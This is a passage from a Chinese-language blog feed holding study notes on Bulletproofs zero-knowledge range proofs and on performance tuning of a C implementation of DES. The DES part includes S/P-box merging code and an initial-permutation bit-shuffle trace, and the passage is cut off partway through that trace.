      
    </entry>
    
    
    
    <entry>
      <title>Bullet Proofs</title>
      <link href="/2021/10/31/Bullet-Proofs/"/>
      <url>/2021/10/31/Bullet-Proofs/</url>
      
        <content type="html"><![CDATA[<h3 id="Pedersen-Commitment"><a href="#Pedersen-Commitment" class="headerlink" title="Pedersen Commitment"></a>Pedersen Commitment</h3><p>$Com(v)=v\cdot B+\tilde{v}\cdot\tilde{B}$，其中$B,\tilde{B}$为椭圆曲线上的两个基点，$v$是需要承诺的秘密数，$\tilde{v}$为（随机）盲化因子。</p><p>具备同态加法特性，即：</p><p>$Com(v_1)+Com(v_2)=v_1\cdot B+\tilde{v_1}\cdot\tilde{B}+v_2\cdot B+\tilde{v_2}\cdot\tilde{B}=(v_1+v_2)\cdot B+(\tilde{v_1}+\tilde{v_2})\cdot\tilde{B}=Com(v_1+v_2)$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101220609819.png" alt></p><p>同态保证了UTXO交易中的Input/Output总和均是Pedersen Commitment</p><p>⭐<strong>(Pedersen Vector Commitment)</strong></p><p>$\textbf{B}=(B_1,…,B_n)\in\mathbb{G}^n$</p><p>$Com(\textbf{v}=(v_1,…,v_n);\tilde{v})=\langle\textbf{v},\textbf{B}\rangle+\tilde{v}\tilde{B}$</p><h3 id="Bullet-Proofs"><a href="#Bullet-Proofs" class="headerlink" title="Bullet Proofs"></a>Bullet Proofs</h3><h4 id="Notation"><a href="#Notation" class="headerlink" title="Notation"></a>Notation</h4><p>小写字母$a,b,c$表示$\mathbb{Z}_p$下的标量，大写字母$G,H,P,Q$表示群$\mathbb{G}$下的元素。向量被粗体表示，例如$\textbf{a},\textbf{G}$。</p><p>用到的Pedersen Vector Commitment定义为：</p><script type="math/tex; mode=display">Com(\textbf{a}_L,\textbf{a}_R)=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}</script><p>其中$\textbf{G},\textbf{H}\in\mathbb{G}^n$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101225906030.png" alt></p><h4 id="Inner-Product-Range-Proof"><a href="#Inner-Product-Range-Proof" class="headerlink" title="Inner-Product Range Proof"></a>Inner-Product Range Proof</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101222443822.png" alt></p><p>并将原论文中的乘法群以加法群代替，如下：</p><p>$\{(B,\tilde{B}\in\mathbb{G},V,n\ ;\ v,\tilde{v}\in\mathbb{Z}_p):V=vB+\tilde{v}\tilde{B}\ \wedge\ v\in[0,2^n-1]\}$</p><p>令$\textbf{a}_L=(a_1,…,a_n)\in\{0,1\}^n$表示由$v$各个比特位组成的向量，即$\langle\textbf{a}_L,\textbf{2}^n\rangle=v$ ← ①</p><p>还需要保证$\textbf{a}_L$仅包含$\{0,1\}$，因此令$\textbf{a}_R=\textbf{a}_L-\textbf{1}^n$ ← ②，有$\textbf{a}_L\circ\textbf{a}_R=\textbf{0}^n$ ← ③</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102163505168.png" alt></p><p>做以下整理：</p><script type="math/tex; mode=display">\langle\textbf{a}_L,\textbf{2}^n\rangle=v\ \wedge\langle\textbf{a}_L-\textbf{1}-\textbf{a}_R,\textbf{y}^n\rangle=0\ \wedge\ \langle\textbf{a}_L,\textbf{a}_R\circ\textbf{y}^n\rangle=0</script><p>可进一步，令verifier选取随机$z\in\mathbb{Z}_p$，将上述转为一个约束：</p><script type="math/tex; mode=display">z^2\cdot v=z^2\langle\textbf{a}_L,\textbf{2}^n\rangle+z\langle\textbf{a}_L-\textbf{1}-\textbf{a}_R,\textbf{y}^n\rangle+\langle\textbf{a}_L,\textbf{a}_R\circ\textbf{y}^n\rangle</script><p>将其转化为前面论文中提到的”a single inner-product constraint”（并令$\textbf{a}_L$只出现在左侧，$\textbf{a}_R$只出现在右侧，不含witness的项合并即为$\delta$）：</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102181623065.png" alt></p><p>将此时内积的左侧记作<em>unblinded l(X)</em>，右侧记作<em>unblinded r(X)</em></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102171502891.png" alt></p><p>下面是盲化后新定义的多项式$l(X),r(X)$，以及二次多项式$t(X)$：</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102171740440.png" alt></p><p>Prover需要证明$t_0=z^2v+\delta(y,z)$，$l(X),r(X)$正确，以及$t(X)=\langle l(X),r(X)\rangle$</p><hr><p>$\mathcal{P}$ computes:</p><p>$\quad\tilde{t_1},\tilde{t_2}\longleftarrow\mathbb{Z}_p$</p><p>$\quad T_i=t_1B+\tilde{t_1}\tilde{B}\in\mathbb{G},\quad i=\{1,2\}$</p><p>$\mathcal{P}\rightarrow\mathcal{V}:T_1,T_2$</p><p>$\mathcal{V}:x\longleftarrow\mathbb{Z}^{*}_{p}\quad(\mathbb{Z}_{p}\backslash\{0\})$</p><p>$\mathcal{V}\rightarrow\mathcal{P}:x$&emsp;// a random challenge</p><p>$\mathcal{P}$ computes:</p><p>$\quad\textbf{l}=l(x)=\textbf{a}_L+\textbf{s}_L\cdot x-z\cdot\textbf{1}\in\mathbb{Z}^{n}_{p}$</p><p>$\quad\textbf{r}=r(x)=\textbf{y}^{n}\circ(\textbf{a}_R+\textbf{s}_R\cdot x+z\cdot\textbf{1})+z^2\cdot\textbf{2}^n\in\mathbb{Z}^{n}_{p}$</p><p>$\quad\textbf{t}=t(x)=\langle\textbf{l},\textbf{r}\rangle\in\mathbb{Z}_p$</p><p>$\quad\tilde{t}=z^2\cdot\tilde{v}+\tilde{t_1}\cdot x+\tilde{t_2}\cdot x^2\in\mathbb{Z}_p$&emsp;// blinding value for $\textbf{t}$</p><p>$\quad\tilde{e}=\tilde{a}+\tilde{s}\cdot x\in\mathbb{Z}_p$&emsp;// $\tilde{a},\tilde{s}$ blind $A,S$</p><p>$\mathcal{P}\rightarrow\mathcal{V}:\textbf{t},\tilde{t},\tilde{e},\textbf{l},\textbf{r}$</p><hr><p>而更在上述（分割线内）步骤之前，还需要先于”$\mathcal{V}\rightarrow\mathcal{P}:challenge\ value\ y$”，$\mathcal{P}\rightarrow\mathcal{V}:commitment\ A,S$：</p><p>$A=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}$</p><p>$S=\langle\textbf{s}_L,\textbf{G}\rangle+\langle\textbf{s}_R,\textbf{H}\rangle+\tilde{s}\tilde{B}$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103172058685.png" alt></p><p>但需要对复合变量$\textbf{y}^{n}\circ\textbf{a}_R,\textbf{y}^{n}\circ\textbf{s}_R$作出承诺，且</p><p>$Com(\textbf{a}_L,\textbf{a}_R,\tilde{a})=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{y}^n\circ\textbf{a}_R,\textbf{y}^{-n}\circ\textbf{H}\rangle+\tilde{a}\tilde{B}$</p><p>因此令$\textbf{H’}=\textbf{y}^{-n}\circ\textbf{H}$，即$H_i^{‘}=y^{-i+1}\cdot H_i,\quad i=1,…,n$</p><p>由 <em>Verifier</em> 将原commitment A, S变形为对应$\textbf{H’}$以及复合变量的commitment</p><hr><p>All based on <em>ECDLP</em></p><p>$\textbf{t}B+\tilde{t}\tilde{B}\stackrel{?}{=}z^{2}V+\delta(y,z)B+T_1\cdot x+T_2\cdot x^2$&emsp;// ① check that $\textbf{t}=z^2v+\delta(y,z)+t_1x+t_2x^2$</p><p>$A+S\cdot x-z\langle\textbf{1},\textbf{G}\rangle+\langle z\textbf{y}^n+z^2\textbf{2}^n,\textbf{H’}\rangle-\tilde{e}\tilde{B}\stackrel{?}{=}\langle\textbf{l},\textbf{G}\rangle+\langle\textbf{r},\textbf{H’}\rangle$&emsp;// ② check that $l(X),r(X)$ are correct</p><p>$\textbf{t}\stackrel{?}{=}\langle\textbf{l},\textbf{r}\rangle$&emsp;// ③ check that $t(X)=\langle l(X),r(X)\rangle$</p><hr><p>但校验②③：<em>Prover</em>和<em>Verifier</em>之间直接传输$\textbf{l},\textbf{r}$，导致需要$2n$个标量的带宽</p><h4 id="Logarithmic-Range-Proof"><a href="#Logarithmic-Range-Proof" class="headerlink" title="Logarithmic Range Proof"></a>Logarithmic Range Proof</h4><p>内积协议一般用于证明以下关系：</p><script type="math/tex; mode=display">\{(\textbf{G},\textbf{H}\in\mathbb{G}^n,P\in\mathbb{G},c\in\mathbb{Z}_p;\ \textbf{a},\textbf{b}\in\mathbb{Z}^{n}_{p}):\ P=\textbf{aG}+\textbf{bH}\wedge c=\langle\textbf{a},\textbf{b}\rangle\}</script><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103202149106.png" alt></p><p>等价于证明：</p><script type="math/tex; mode=display">\{(\textbf{G},\textbf{H}\in\mathbb{G}^n,u,P\in\mathbb{G};\ \textbf{a},\textbf{b}\in\mathbb{Z}^{n}_{p}):\ P=\textbf{aG}+\textbf{bH}+\langle\textbf{a},\textbf{b}\rangle u\}</script><p>引入中间变量$x\in\mathbb{Z}_{p}^{\times}$，记$n’=n/2$，对原始的$\textbf{a},\textbf{b},\textbf{G},\textbf{H}$作以下变换：</p><script type="math/tex; mode=display">\textbf{a}'=x\textbf{a}_{[:n']}+x^{-1}\textbf{a}_{[n':]}\in\mathbb{Z}_p^{n'}\\\textbf{b}'=x^{-1}\textbf{b}_{[:n']}+x\textbf{b}_{[n':]}\in\mathbb{Z}_p^{n'}\\\textbf{G}'=x^{-1}\textbf{G}_{[:n']}+x\textbf{G}_{[n':]}\in\mathbb{G}^{n'}\\\textbf{H}'=x\textbf{H}_{[:n']}+x^{-1}\textbf{H}_{[n':]}\in\mathbb{G}^{n'}\\</script><p>令$P’=\langle\textbf{a}’,\textbf{G}’\rangle+\langle\textbf{b}’,\textbf{H}’\rangle+\langle\textbf{a}’,\textbf{b}’\rangle u$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103215000179.png" alt></p><p>当$P=\textbf{aG}+\textbf{bH}+\langle\textbf{a},\textbf{b}\rangle u$成立时，上述推导成立，即$P’=P+x^2L+x^{-2}R$</p><p>此时传输的$\textbf{a},\textbf{b}$就转为了$\textbf{a}’,\textbf{b}’$（带宽/2）</p><p>因此我们可以递归压缩$P$（记作$P^{(0)}$），得到</p><p>$P^{(k)}=\langle\textbf{a}^{(k)},\textbf{G}^{(k)}\rangle+\langle\textbf{b}^{(k)},\textbf{H}^{(k)}\rangle+\langle\textbf{a}^{(k)},\textbf{b}^{(k)}\rangle u$</p><p>$P^{(k)}=P^{(0)}+\sum_{i=1}^{k}(x^2L^{(i-1)}+x^{-2}R^{(i-1)})$</p><p>此时<em>Verifier</em>只需验证</p><script type="math/tex; mode=display">P^{(0)}\stackrel{?}{=}\langle\textbf{a}^{(k)},\textbf{G}^{(k)}\rangle+\langle\textbf{b}^{(k)},\textbf{H}^{(k)}\rangle+\langle\textbf{a}^{(k)},\textbf{b}^{(k)}\rangle u-\sum_{i=1}^{k}(x^2L^{(i-1)}+x^{-2}R^{(i-1)})</script><p>即可</p><p><em>Proofer</em>需要发送$(\textbf{a}^{(k)},\textbf{b}^{(k)})$以及$k$轮的$(L,R)$，消耗带宽从$2n$降到了$2logn+2$.</p><p>将前文的<strong>校验②③</strong>改用这种方法，来实现对数级的压缩。</p><h4 id="Aggregating-Logarithmic-Proofs"><a href="#Aggregating-Logarithmic-Proofs" class="headerlink" title="Aggregating Logarithmic Proofs"></a>Aggregating Logarithmic Proofs</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104201755929.png" alt></p><p>红框中为$\sum_{j=1}^{m}(z^{1+j})$，而非$\sum z^2$，是因为下面原有式子中的$z^{2}$，在$m$个individual range proofs整合时，采用不同的幂次$z^{3},z^{4},…$（仍然成立）</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104202958100.png" alt></p><p>进一步的，定义新的 $\tilde{t}=\tilde{t_1}\cdot x+\tilde{t_2}\cdot x^2+\sum_{j=1}^{m}z^{1+j}\cdot\tilde{v_j}$ （其中$\tilde{v_j}$为对应$v_j$的盲化因子，$j=1,…,m$）</p><p>$\delta(y,z)=(z-z^2)\langle\textbf{1}^{n\cdot m},\textbf{y}^{n\cdot m}\rangle-\sum_{j=1}^{m}z^{j+2}\langle\textbf{1}^{n},\textbf{2}^{n}\rangle$</p><p>前文的校验①改写为：</p><script type="math/tex; mode=display">\textbf{t}B+\tilde{t}\tilde{B}\stackrel{?}{=}z^{2}\langle\textbf{z}^{m},\textbf{V}\rangle+\delta(y,z)B+T_1\cdot x+T_2\cdot x^2\\,其中\ \textbf{V}=(V_1,V_2,...,V_m)\in\mathbb{G}^{m},\textbf{z}^{m}=(1,z,z^2,...,z^{m-1})\in\mathbb{Z}_{p}^{m}</script><p>校验②的<strong>左侧</strong>改写为：</p><script type="math/tex; mode=display">A+S\cdot x-z\langle\textbf{1}^{n\cdot m},\textbf{G}\rangle+\langle z\textbf{y}^{n\cdot m}+\sum_{j=1}^{m}z^{1+j}\cdot(\textbf{0}^{(j-1)n}\|\textbf{2}^n\|\textbf{0}^{(m-j)n},\textbf{H'}\rangle-\tilde{e}\tilde{B}</script><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104222111097.png" alt></p><h4 id="Non-Interactive-Proof-through-Fiat-Shamir"><a href="#Non-Interactive-Proof-through-Fiat-Shamir" class="headerlink" title="Non-Interactive Proof through Fiat-Shamir"></a>Non-Interactive Proof through Fiat-Shamir</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104222420877.png" alt></p><p>Fiat-Shamir直观表示可看知乎回答<a href="https://zhuanlan.zhihu.com/p/95921725" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/95921725</a></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Engineering Practice of Cryptosystem</title>
      <link href="/2021/10/28/Engineering-Practice-of-Cryptosystem/"/>
      <url>/2021/10/28/Engineering-Practice-of-Cryptosystem/</url>
      
        <content type="html"><![CDATA[<h4 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h4><p>略</p><h4 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h4><p>实现DES的时候发现性能一直提不上去（v1测试后≈750us/KB，距离要求的500Mbps还有亿点点距离…🤦‍）</p><p>在此记录尝试提升性能过程中更迭的几个版本</p><h5 id="Combine-S-and-P-boxes"><a href="#Combine-S-and-P-boxes" class="headerlink" title="Combine S and P boxes"></a><em>Combine S and P boxes</em></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> spbox[<span class="number">8</span>][<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_spbox</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++) &#123;</span><br><span class="line">            spbox[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> real_j = ((((j &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x02</span>) | (j &amp; <span class="number">0x01</span>)) &lt;&lt; <span class="number">4</span>) | ((j &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sbox[i][real_j] &amp; (<span class="number">0x08</span> &gt;&gt; k)) &#123;</span><br><span class="line">                    spbox[i][j] |= <span class="number">1</span> &lt;&lt; (<span class="number">32</span> - inv_pbox[<span class="number">4</span> * i + k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//#ifdef DEBUG</span></span><br><span class="line"><span class="comment">//            printf("spbox[%d][%2d]=%08x\n", i, j, spbox[i][j]);</span></span><br><span class="line"><span class="comment">//#endif</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Construct-fewer-Bit-Operations"><a href="#Construct-fewer-Bit-Operations" class="headerlink" title="Construct fewer Bit Operations"></a><em>Construct fewer Bit Operations</em></h5><p>开销主要在于BIT_TO_BYTE和BYTE_TO_BIT 👉 IP，PC-1，PC-2等置换均是基于bit数组上做的处理</p><p>因此参考mbed TLS，摒弃bit数组，构造更少步骤的位运算来提升性能</p><ul><li><p>Initial Permutation (IP)</p><p>mbed TLS用到一个小trick：</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028203914919.png" alt></p><p>可以达到类似shuffle的目的，我们再回过头来看IP：</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028204203451.png" alt></p><p><strong>逆推</strong>回初始的X = [1 2 … 32], Y = [33 34 … 64]状态（找如何shuffle能得到<strong>连续序列</strong>）</p><p>逆推过程的逻辑很清晰，但不在此特意画出，下面是正向的变换逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((X &gt;&gt; <span class="number">4</span>) ^ Y) &amp; <span class="number">0x0f0f0f0f</span></span><br><span class="line">Y ^= T  </span><br><span class="line">X ^= (T &lt;&lt; <span class="number">4</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span></span><br><span class="line">X = </span><br><span class="line"><span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((X &gt;&gt; <span class="number">16</span>) ^ Y) &amp; <span class="number">0x0000ffff</span></span><br><span class="line">Y ^= T</span><br><span class="line">X ^= (T &lt;&lt; <span class="number">16</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">2</span>) ^ X) &amp; <span class="number">0x33333333</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">2</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">57</span> <span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">8</span>) ^ X) &amp; <span class="number">0x00ff00ff</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">8</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">57</span> <span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = ((Y &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>) | (Y &gt;&gt; <span class="number">31</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span> <span class="number">57</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = (X ^ Y) &amp; <span class="number">0xaaaaaaaa</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= T</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">58</span> <span class="number">50</span> <span 